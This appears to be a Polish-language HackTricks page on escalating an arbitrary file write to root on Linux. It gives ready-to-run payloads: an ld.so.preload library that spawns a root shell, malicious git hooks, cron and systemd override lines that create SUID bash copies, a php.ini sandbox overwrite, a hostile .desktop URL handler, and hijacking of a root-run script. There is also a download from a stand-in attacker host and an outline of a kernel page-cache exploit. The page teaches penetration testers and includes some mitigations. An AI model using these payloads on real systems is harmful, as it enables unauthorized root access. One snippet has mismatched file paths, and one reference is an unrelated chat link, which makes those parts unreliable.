# Dowolny zapis pliku do root

{{#include ../../banners/hacktricks-training.md}}

### /etc/ld.so.preload

Ten plik działa podobnie do zmiennej środowiskowej **`LD_PRELOAD`**, ale działa też w **binariach SUID**.\
Jeśli możesz go utworzyć lub zmodyfikować, możesz po prostu dodać **ścieżkę do biblioteki, która będzie ładowana** przy każdym uruchomionym binarium.

Na przykład: `echo "/tmp/pe.so" > /etc/ld.so.preload`
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unlink("/etc/ld.so.preload");
setgid(0);
setuid(0);
system("/bin/bash");
}
//cd /tmp
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
### Git hooks

[**Git hooks**](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks) to **skrypty**, które są **uruchamiane** przy różnych **zdarzeniach** w repozytorium git, takich jak tworzenie commita, merge... Jeśli więc **uprzywilejowany skrypt lub użytkownik** wykonuje te akcje często i możliwe jest **zapisywanie do folderu `.git`**, można to wykorzystać do **privesc**.

Na przykład możliwe jest **wygenerowanie skryptu** w repo git w **`.git/hooks`**, aby był on zawsze wykonywany przy utworzeniu nowego commita:
```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/b' > pre-commit
chmod +x pre-commit
```
### Pliki Cron i Time

Jeśli możesz **zapisywać pliki związane z cronem, które wykonuje root**, zazwyczaj możesz uzyskać wykonanie kodu przy następnym uruchomieniu zadania. Interesujące cele to:

- `/etc/crontab`
- `/etc/cron.d/*`
- `/etc/cron.hourly/*`, `/etc/cron.daily/*`, `/etc/cron.weekly/*`, `/etc/cron.monthly/*`
- Własny crontab roota w `/var/spool/cron/` lub `/var/spool/cron/crontabs/`
- Timery `systemd` i usługi, które uruchamiają

Szybkie sprawdzenia:
```bash
ls -la /etc/crontab /etc/cron.d /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly 2>/dev/null
find /var/spool/cron* -maxdepth 2 -type f -ls 2>/dev/null
systemctl list-timers --all 2>/dev/null
grep -R "run-parts\\|cron" /etc/crontab /etc/cron.* /etc/cron.d 2>/dev/null
```
Typowe ścieżki nadużycia:

- **Dopisz nowe zadanie cron root** do `/etc/crontab` lub pliku w `/etc/cron.d/`
- **Zastąp skrypt** już wykonywany przez `run-parts`
- **Dodaj backdoor do istniejącego targetu timera** przez modyfikację skryptu lub binarki, którą uruchamia

Minimalny przykład payloadu cron:
```bash
echo '* * * * * root cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash' >> /etc/crontab
```
Jeśli możesz pisać tylko w katalogu cron używanym przez `run-parts`, wrzuć tam zamiast tego plik wykonywalny:
```bash
cat > /etc/cron.daily/backup <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/rootbash
chown root:root /tmp/rootbash
chmod 4777 /tmp/rootbash
EOF
chmod +x /etc/cron.daily/backup
```
Uwagi:

- `run-parts` zwykle ignoruje nazwy plików zawierające kropki, więc preferuj nazwy takie jak `backup` zamiast `backup.sh`.
- Niektóre distros używają `anacron` lub `systemd` timers zamiast klasycznego cron, ale idea nadużycia jest taka sama: **zmodyfikować to, co root później wykona**.

### Pliki Service & Socket

Jeśli możesz zapisywać pliki jednostek `systemd` albo pliki, do których się odwołują, możesz uzyskać wykonanie kodu jako root przez ponowne załadowanie i restart jednostki albo czekając, aż uruchomi się ścieżka aktywacji service/socket.

Interesujące cele obejmują:

- `/etc/systemd/system/*.service`
- `/etc/systemd/system/*.socket`
- Drop-in overrides w `/etc/systemd/system/<unit>.d/*.conf`
- Skrypty/binary service, do których odwołują się `ExecStart=`, `ExecStartPre=`, `ExecStartPost=`
- Zapisywalne ścieżki `EnvironmentFile=` ładowane przez usługę root

Szybkie sprawdzenia:
```bash
ls -la /etc/systemd/system /lib/systemd/system 2>/dev/null
systemctl list-units --type=service --all 2>/dev/null
systemctl list-units --type=socket --all 2>/dev/null
grep -R "^ExecStart=\\|^EnvironmentFile=\\|^ListenStream=" /etc/systemd/system /lib/systemd/system 2>/dev/null
```
Typowe ścieżki nadużycia:

- **Nadpisz `ExecStart=`** w jednostce usługi należącej do root, którą możesz modyfikować
- **Dodaj drop-in override** z złośliwym `ExecStart=` i najpierw usuń stary
- **Wstaw backdoor do skryptu/binarki** już wskazywanej przez jednostkę
- **Przejmij usługę aktywowaną przez socket** przez modyfikację odpowiedniego pliku `.service`, który uruchamia się, gdy socket otrzyma połączenie

Przykład złośliwego override:
```ini
[Service]
ExecStart=
ExecStart=/bin/sh -c 'cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash'
```
Typowy przepływ aktywacji:
```bash
systemctl daemon-reload
systemctl restart vulnerable.service
# or trigger the socket-backed service by connecting to it
```
Jeśli nie możesz samodzielnie zrestartować usług, ale możesz edytować unit aktywowany przez socket, możesz tylko **poczekać na połączenie klienta**, aby wyzwolić wykonanie zbackdoorowanego serwisu jako root.

### Nadpisz restrykcyjny `php.ini` używany przez uprzywilejowany PHP sandbox

Niektóre niestandardowe demony walidują PHP dostarczany przez użytkownika, uruchamiając `php` z **ograniczonym `php.ini`** (na przykład `disable_functions=exec,system,...`). Jeśli sandboxowany kod nadal ma **jakikolwiek write primitive** (jak `file_put_contents`) i możesz dotrzeć do **dokładnej ścieżki `php.ini`** używanej przez demona, możesz **nadpisać tę konfigurację**, aby zdjąć ograniczenia, a następnie przesłać drugi payload, który uruchomi się z podwyższonymi uprawnieniami.

Typowy przebieg:

1. Pierwszy payload nadpisuje konfigurację sandboxa.
2. Drugi payload wykonuje kod, gdy niebezpieczne funkcje są ponownie włączone.

Minimalny przykład (zamień ścieżkę używaną przez demona):
```php
<?php
file_put_contents('/path/to/sandbox/php.ini', "disable_functions=\n");
```
Jeśli daemon działa jako root (albo waliduje przy użyciu ścieżek należących do root), drugie uruchomienie daje context root. To w praktyce **privilege escalation via config overwrite** wtedy, gdy sandboxed runtime nadal może zapisywać pliki.

### binfmt_misc

Plik znajdujący się w `/proc/sys/fs/binfmt_misc` wskazuje, który binary powinien uruchamiać jaki typ plików. TODO: sprawdź wymagania, aby nadużyć to do uruchomienia rev shell, gdy otwierany jest popularny typ pliku.

### Overwrite schema handlers (like http: or https:)

Atakujący z uprawnieniami zapisu do katalogów konfiguracyjnych ofiary może łatwo podmienić lub utworzyć pliki, które zmieniają zachowanie systemu, co prowadzi do niezamierzonego code execution. Modyfikując plik `$HOME/.config/mimeapps.list` tak, aby HTTP i HTTPS URL handlers wskazywały na złośliwy plik (np. ustawiając `x-scheme-handler/http=evil.desktop`), atakujący zapewnia, że **kliknięcie dowolnego linku http lub https uruchamia code zdefiniowany w pliku `evil.desktop`**. Na przykład po umieszczeniu poniższego złośliwego kodu w `evil.desktop` w `$HOME/.local/share/applications`, każde kliknięcie zewnętrznego URL uruchamia osadzoną komendę:
```bash
[Desktop Entry]
Exec=sh -c 'zenity --info --title="$(uname -n)" --text="$(id)"'
Type=Application
Name=Evil Desktop Entry
```
Więcej informacji znajdziesz w [**tym poście**](https://chatgpt.com/c/67fac01f-0214-8006-9db3-19c40e45ee49), gdzie zostało to użyte do wykorzystania prawdziwej podatności.

### Root wykonujący user-writable scripts/binaries

Jeśli uprzywilejowany workflow uruchamia coś w rodzaju `/bin/sh /home/username/.../script` (albo dowolny binary wewnątrz katalogu należącego do nieuprzywilejowanego użytkownika), możesz to przejąć:

- **Wykryj execution:** monitoruj procesy za pomocą [pspy](https://github.com/DominicBreuker/pspy), aby wychwycić root wywołującego user-controlled paths:
```bash
wget http://attacker/pspy64 -O /dev/shm/pspy64
chmod +x /dev/shm/pspy64
/dev/shm/pspy64   # wait for root commands pointing to your writable path
```
- **Potwierdź możliwość zapisu:** upewnij się, że zarówno plik docelowy, jak i jego katalog są należące do Twojego użytkownika i zapisywalne.
- **Przejmij cel:** zrób backup oryginalnego binarium/skryptu i wgraj payload, który tworzy powłokę SUID (lub wykonuje inne działanie jako root), a następnie przywróć uprawnienia:
```bash
mv server-command server-command.bk
cat > server-command <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootshell
chown root:root /tmp/rootshell
chmod 6777 /tmp/rootshell
EOF
chmod +x server-command
```
- **Wyzwól uprzywilejowaną akcję** (np. naciśnij przycisk UI, który uruchamia helpera). Gdy root ponownie wykona hijacked path, przechwyć eskalowaną powłokę z `./rootshell -p`.

### Modyfikacja samego page cache plików uprzywilejowanych binarek

Niektóre błędy kernel nie modyfikują pliku **na dysku**. Zamiast tego pozwalają modyfikować tylko **page cache copy** pliku, który da się odczytać. Jeśli możesz zaatakować binarkę **setuid** albo inną uruchamianą przez **root-executed**, następne wykonanie może uruchomić bajty kontrolowane przez atakującego z pamięci i podnieść uprawnienia, mimo że hash pliku na dysku się nie zmienił.

Warto myśleć o tym jako o **runtime-only file write primitive**:

- **Disk stays clean**: inode i bajty na dysku nie zmieniają się
- **Memory is dirty**: procesy odczytujące/wykonujące cache’owaną stronę dostają zmodyfikowaną przez atakującego zawartość
- **Efekt jest tymczasowy**: zmiana znika po reboot albo po eviction cache

Ta primitive leży pomiędzy klasycznym **arbitrary file write** a starszymi błędami **page-cache abuse** takimi jak Dirty COW / Dirty Pipe:

- Dirty COW polegał na race
- Dirty Pipe miał ograniczenia pozycji zapisu
- Primitive tylko dla page cache może być bardziej niezawodna, jeśli podatna ścieżka daje bezpośredni zapis do cached file-backed pages

#### Generic privesc flow

1. Zdobądź kernel primitive, która może zapisywać do **file-backed page cache pages**
2. Użyj jej wobec **readable privileged binary** albo innego pliku uruchamianego przez root
3. Wywołaj execution **zanim** strona zostanie usunięta z cache
4. Uzyskaj code execution jako root, gdy plik na dysku nadal wygląda na niezmodyfikowany

Typowe cele o wysokiej wartości:

- binarki **setuid-root**
- helpery uruchamiane przez **root services**
- binarki często uruchamiane z **containers sharing the host kernel/page cache**

#### AF_ALG + `splice()` example path

Copy Fail (CVE-2026-31431) jest dobrym przykładem tej klasy. Podatna ścieżka była w Linux crypto userspace API (`AF_ALG` / `algif_aead`):

- `splice()` może przenosić referencje do page-cache pages z readable file do crypto TX scatterlist
- in-place ścieżka decrypt `algif_aead` ponownie używała source i destination buffers
- `authencesn` potem zapisywał do destination tag region
- gdy ten region nadal wskazywał na spliced file-backed pages, zapis trafiał do **page cache of the target file**

Czyli interesująca jest nie sama CVE, tylko wzorzec:

- **feed file-backed cache pages into a kernel subsystem**
- spraw, by subsystem **traktował je jako writable output**
- wyzwól mały, kontrolowany overwrite w pamięci

Publiczny PoC używał powtarzanych **4-byte writes** do patchowania `/usr/bin/su` w pamięci, a następnie uruchamiał go.

#### Exposure and hunting

Jeśli podejrzewasz tę klasę błędu, nie polegaj wyłącznie na kontrolach integralności dysku. Zweryfikuj też:
```bash
uname -r
grep CONFIG_CRYPTO_USER_API_AEAD= /boot/config-$(uname -r) 2>/dev/null
lsmod | grep algif_aead
find / -perm -4000 -type f 2>/dev/null
```
- `CONFIG_CRYPTO_USER_API_AEAD=m`: `algif_aead` może być ładowalny/rozładowywalny jako moduł
- `CONFIG_CRYPTO_USER_API_AEAD=y`: interfejs jest wbudowany w kernel
- binaria setuid są dobrymi celami, ponieważ patch tylko w page-cache może wystarczyć, aby zamienić local foothold w root

#### Redukcja attack surface dla ścieżki `algif_aead`

Jeśli podatny interfejs jest dostarczany przez ładowalny moduł:
```bash
echo "install algif_aead /bin/false" > /etc/modprobe.d/disable-algif.conf
rmmod algif_aead 2>/dev/null || true
```
Jeśli zostanie skompilowane do jądra, niektóre ujawnienia zgłaszały blokowanie ścieżki init za pomocą:
```bash
initcall_blacklist=algif_aead_init
```
Tego rodzaju mitigacja jest warta zapamiętania także dla innych kernel LPE: jeśli exploitacja zależy od konkretnego opcjonalnego interface, wyłączenie lub zblacklistowanie tego interface może przerwać ścieżkę exploita jeszcze zanim będzie dostępny pełny kernel upgrade.

## References

- [HTB Bamboo – hijacking a root-executed script in a user-writable PaperCut directory](https://0xdf.gitlab.io/2026/02/03/htb-bamboo.html)
- [HTB: Gavel](https://0xdf.gitlab.io/2026/03/14/htb-gavel.html)
- [Tenable: Copy Fail (CVE-2026-31431) FAQ](https://www.tenable.com/blog/copy-fail-cve-2026-31431-frequently-asked-questions-about-linux-kernel-privilege-escalation)
- [Openwall oss-security disclosure for CVE-2026-31431](https://www.openwall.com/lists/oss-security/2026/04/29/23)
- [Linux stable fix: crypto: algif_aead - Revert to operating out-of-place](https://git.kernel.org/stable/c/a664bf3d603dc3bdcf9ae47cc21e0daec706d7a5)
- [Copy Fail advisory](https://copy.fail/)
- [Theori / Xint technical writeup](https://xint.io/blog/copy-fail-linux-distributions)

{{#include ../../banners/hacktricks-training.md}}
